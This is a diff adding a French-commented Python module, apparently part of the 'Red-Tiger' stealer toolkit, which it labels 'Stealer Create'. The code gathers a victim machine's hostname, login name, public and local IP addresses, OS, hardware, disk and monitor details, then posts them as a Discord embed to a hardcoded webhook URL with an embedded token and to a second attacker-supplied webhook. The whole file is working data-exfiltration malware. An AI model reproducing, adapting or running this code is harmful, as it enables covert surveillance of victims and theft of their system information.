@@ -1,0 +1,267 @@
+import socket
+import requests
+import json
+import os
+import platform
+import requests
+import ctypes
+from screeninfo import get_monitors
+import psutil
+import GPUtil
+
+
+#Recuperation du nom du pc
+try:
+ nom_pc = socket.gethostname()
+except:
+ nom_pc = "N/A"
+
+try:
+ nom_utilisateur = os.getlogin()
+except:
+ nom_utilisateur = "N/A"
+
+#Recuperation de l'IP Publique
+try:
+ response = requests.get('https://httpbin.org/ip')
+        
+ ip_address_public = response.json()['origin']
+
+except:
+ ip_address_public = "N/A"
+
+#Recuperation de l'IP Local
+try:
+ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ s.connect(('8.8.8.8', 80))
+
+ ip_address_local = s.getsockname()[0]
+
+ s.close()
+except:
+ ip_address_local = "N/A"
+
+
+#Recuperation de l'IP Ipv4
+try:
+ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ s.connect(('8.8.8.8', 80))  
+
+ ip_address_ipv4 = s.getsockname()[0]
+ s.close()
+except:
+ ip_address_ipv4 = "N/A"
+
+
+#Recuperation de l'IP Ipv6
+try:
+ s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+ s.connect(('2001:4860:4860::8888', 80))
+
+ ip_address_ipv6 = s.getsockname()[0]
+except:
+ ip_address_ipv6 = "N/A"
+
+#Recuperation de son systeme d'exploitation
+try:
+ system_info = {platform.system()}
+ system_version_info = platform.version()
+except:
+ system_info = "N/A"
+ system_version_info = "N/A"
+
+#Recuperation des RAM
+try:
+ ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
+except:
+ ram_info = "N/A"
+
+#Recuperation du processeur et des coeur
+try:
+ cpu_info = platform.processor()
+ cpu_coeur_info = psutil.cpu_count(logical=False)
+except:
+ cpu_info = "N/A"
+ cpu_coeur_info = "N/A"
+
+#Recuperation de la carte graphique
+try:
+ gpus = GPUtil.getGPUs()
+ gpu_info = gpus[0].name if gpus else "N/A"
+except:
+ gpu_info = "N/A"
+
+
+#Recuperation info disque
+try:
+ disk_info = psutil.disk_usage(path='/')
+
+ espace_disque = round(disk_info.total / (1024**3), 2)
+ espace_utilise_disque = round(disk_info.used / (1024**3), 2)
+ espace_dispo_disque = round(disk_info.free / (1024**3), 2)
+except:
+ disk_info = "N/A"
+ espace_disque = "N/A"
+ espace_utilise_disque = "N/A"
+ espace_dispo_disque = "N/A"
+
+#Lettre disque dur
+try:
+ repertoire_courant = os.getcwd()
+
+ lettre_lecteur = os.path.splitdrive(repertoire_courant)[0]
+except:
+ lettre_lecteur = "N/A"
+
+
+#Recuperer portable ou fix
+try:
+ def is_portable():
+    try:
+        battery = psutil.sensors_battery()
+        return battery is not None and battery.power_plugged is not None
+    except AttributeError:
+        return False
+
+ if is_portable():
+    plateforme_info = 'Pc Portable'
+ else:
+    plateforme_info = 'Pc Fixe'
+except:
+ plateforme_info = "N/A"
+
+
+#Recuperer les info ECRAN PRINCIPAL:
+try:
+ def get_resolution():
+    hdc = ctypes.windll.user32.GetDC(0)
+    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
+    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
+    ctypes.windll.user32.ReleaseDC(0, hdc)
+    return width, height
+
+ for i, monitor in enumerate(get_monitors(), 1):
+    if monitor.is_primary:
+        width, height = get_resolution()
+        name = monitor.name
+        is_primary = 'Oui'
+
+ principal_ecran = f"""Nom             : "{name}" 
+Resolution      : "{width}x{height}"
+Ecran Principal : "{is_primary}"
+"""
+except:
+ principal_ecran = "N/A"
+
+#Recuperer info ECRAN SECONDAIRE
+try:
+ def get_resolution():
+    hdc = ctypes.windll.user32.GetDC(0)
+    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
+    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
+    ctypes.windll.user32.ReleaseDC(0, hdc)
+    return width, height
+
+
+ monitors = list(get_monitors())
+
+ if len(monitors) > 1:
+
+    second_monitor = monitors[1]
+
+    width, height = get_resolution()
+
+    second_ecran =  f"""Nom             : "{second_monitor.name}" 
+Resolution      : "{width}x{height}"
+Ecran Principal : "Non"
+"""
+ else:
+   second_ecran = 'N/A'
+except:
+ second_ecran = "N/A"
+
+
+webhook_invit = ''
+
+def send_embed(webhook_url, title, color=0xf00020):
+
+    embed_data = {
+        'title': title,
+        "fields": fields,
+        'color': color,
+        "author": author,
+        "footer": footer
+    }
+
+
+    data = {
+        'embeds': [embed_data],
+        'username': username,  
+        'avatar_url': avatar_url 
+    }
+
+
+    json_data = json.dumps(data)
+
+
+    headers = {
+        'Content-Type': 'application/json'
+    }
+
+
+    response = requests.post(webhook_url, data=json_data, headers=headers)
+
+embed_title = f'Red-Tiger | Info "{nom_pc}"'
+
+fields = [
+    {"name": f"User Pc:", "value": f"""```Name     : "{nom_pc}"
+Username : "{nom_utilisateur}"```""", "inline": False},
+
+    {"name": f"System:", "value": f"""```Plateform    : "{plateforme_info}"
+Exploitation : "{system_info} {system_version_info}"
+
+CPU : "{cpu_info} {cpu_coeur_info} Core"
+GPU : "{gpu_info}"
+RAM : "{ram_info}Go"```""", "inline": False},
+
+{"name": f"Ip:", "value": f"""```Public   : "{ip_address_public}"
+Local    : "{ip_address_local}"
+Ipv4     : "{ip_address_ipv4}"
+Ipv6     : "{ip_address_ipv6}"```""", "inline": False},
+
+{"name": f"Disk:", "value": f"""```Drive      : "{lettre_lecteur}/Users/{nom_utilisateur}/"
+
+Total     : "{espace_disque}Go"
+Used      : "{espace_utilise_disque}Go"
+Available : "{espace_dispo_disque}Go"```""", "inline": False},
+
+{"name": f"Peripheral:", "value": f"""```Main Screen:
+{principal_ecran}
+
+Secondary Screen:
+{second_ecran}```""", "inline": False},
+
+{"name": f"Webhook Use:", "value": f"""```{webhook_invit}```""", "inline": False},
+#{"name": f"", "value": f"""```{}```""", "inline": False},
+] 
+
+author =  {
+        "name": "Red-Tiger | Stealer Create",
+        "url": "https://github.com/fluzzzy/RedTiger-Fluzypro",
+        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
+          }
+
+footer = {
+        "text": "Red-Tiger",
+        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
+        }
+
+embed_color = 0xf00020
+
+username = 'Red-Tiger'
+avatar_url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
+
+webhook_url = 'https://discord.com/api/webhooks/1184942625430720562/_GWFmcTWY0WkLtsoJF0VVbZlBx5scplXFi09eUPM8Yur1sAjM6CQNZfLboIq1ddek_1r'
+
+send_embed(webhook_url, embed_title, embed_color)
+send_embed(webhook_invit, embed_title, embed_color)
